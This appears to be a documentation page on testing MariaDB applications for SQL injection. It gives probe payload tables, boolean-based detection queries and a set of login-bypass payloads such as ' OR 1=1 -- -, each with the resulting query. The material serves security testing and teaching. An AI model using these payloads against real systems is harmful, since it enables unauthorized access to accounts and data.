---
title: Testing Injection
description: Techniques for testing SQL injection vulnerabilities in MariaDB
category: Basics
order: 2
tags: ["testing", "basics", "injection"]
lastUpdated: 2025-12-18
---

When testing for SQL injection vulnerabilities in MariaDB databases, keep in mind:

- False means the query is invalid (MariaDB errors/missing content on website)
- True means the query is valid (content is displayed as usual)

## String-Based Injection

Given the query:

```sql
SELECT * FROM Table WHERE id = '1';
```

| Test Payload | Result | Description                          |
| ------------ | ------ | ------------------------------------ |
| `'`          | False  | Single quote breaks the syntax       |
| `''`         | True   | Two quotes balance each other        |
| `"`          | False  | Double quote breaks the syntax       |
| `""`         | True   | Two double quotes balance each other |
| `\`          | False  | Backslash breaks the syntax          |
| `\\`         | True   | Two backslashes balance each other   |

### Double Quotes as String Delimiters

MariaDB allows double quotes for string values (unlike strict ANSI SQL mode):

```sql
SELECT * FROM users WHERE id = "1"
```

### Quote Escaping

Quotes escape themselves inside strings:

```sql
SELECT 'it''s working' AS result
-- Returns: it's working
```

### Examples

```sql
SELECT * FROM Articles WHERE id = '1''';
```

```sql
SELECT 1 FROM dual WHERE 1 = '1'''''''''''''UNION SELECT '2';
```

### Notes

- You can use as many apostrophes and quotations as you want as long as they pair up
- It is also possible to continue the statement after the chain of quotes
- Quotes escape quotes (single quote escaped by another single quote)

## Numeric-Based Injection

Given the query:

```sql
SELECT * FROM Table WHERE id = 1;
```

| Test Payload | Result | Description                            |
| ------------ | ------ | -------------------------------------- |
| `AND 1`      | True   | Logical truth maintains query validity |
| `AND 0`      | False  | Logical false invalidates the query    |
| `AND true`   | True   | Logical truth maintains query validity |
| `AND false`  | False  | Logical false invalidates the query    |
| `1-false`    | -      | Returns 1 if vulnerable                |
| `1-true`     | -      | Returns 0 if vulnerable                |
| `1*56`       | -      | Returns 56 if vulnerable, 1 if not     |

### Boolean Values

In MariaDB, boolean values are integers:

```sql
SELECT true = 1 AS result   -- Returns: 1 (true)
SELECT false = 0 AS result  -- Returns: 1 (true)
```

### Arithmetic in WHERE Clause

```sql
SELECT * FROM Users WHERE id = 3-2;
-- Returns user with id = 1
```

### Notes

- `true` is equal to 1
- `false` is equal to 0
- Arithmetic expressions are evaluated before comparison

## Boolean-Based Detection

Testing if injection exists by comparing true and false conditions:

### AND 1=1 vs AND 1=2

```sql
-- True condition - returns results
SELECT * FROM users WHERE id = 1 AND 1=1

-- False condition - returns no results
SELECT * FROM users WHERE id = 1 AND 1=2
```

If the application behaves differently between these two queries, injection is confirmed.

### OR 1=1 Returns All Rows

```sql
SELECT * FROM users WHERE id = 999 OR 1=1
-- Returns all users regardless of the non-existent id
```

### String Comparisons

```sql
SELECT * FROM users WHERE '1'='1'  -- Returns all rows (true condition)
SELECT * FROM users WHERE '1'='2'  -- Returns no rows (false condition)
```

## Login Bypass Techniques

Given the query:

```sql
SELECT * FROM users WHERE username = '{input}' AND password = '{pass}';
```

| Test Payload      | Description                      |
| ----------------- | -------------------------------- |
| `' OR '1`         | Unclosed quote absorbed by query |
| `' OR 1 -- -`     | OR true with comment             |
| `" OR "" = "`     | Double quote variant             |
| `" OR 1 = 1 -- -` | Double quote with comment        |
| `'='`             | Empty string equals empty string |
| `'LIKE'`          | Empty LIKE empty is true         |
| `'=0--+`          | Type coercion bypass             |

### Unclosed Quote Injection

The final closing quote from the SQL query structure can absorb an unclosed quote:

```sql
-- Injection: ' OR '1'='1' --
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
-- The username ends with ', starts OR condition with '1'='1', then comments out the rest
```

### Classic OR Injection in Password Field

Inject in the password field while using a valid username:

```sql
-- Username: admin
-- Password: ' OR '' = '
SELECT * FROM users WHERE username = 'admin' AND password = '' OR '' = '';
-- The OR '' = '' is always true
```

### OR 1=1 with Comment

```sql
-- Injection: ' OR 1=1 -- -
SELECT * FROM users WHERE username = '' OR 1=1 -- -' AND password = ''
-- Returns first user (usually admin)
```

### Type Coercion Bypass

```sql
-- Injection: '=0--
-- Query becomes: WHERE username = ''=0-- '
-- ''=0 evaluates due to type coercion, -- comments rest
```

### Balanced Quote Injection

```sql
-- Injection: ' OR '1'='1' --
SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = ''
```
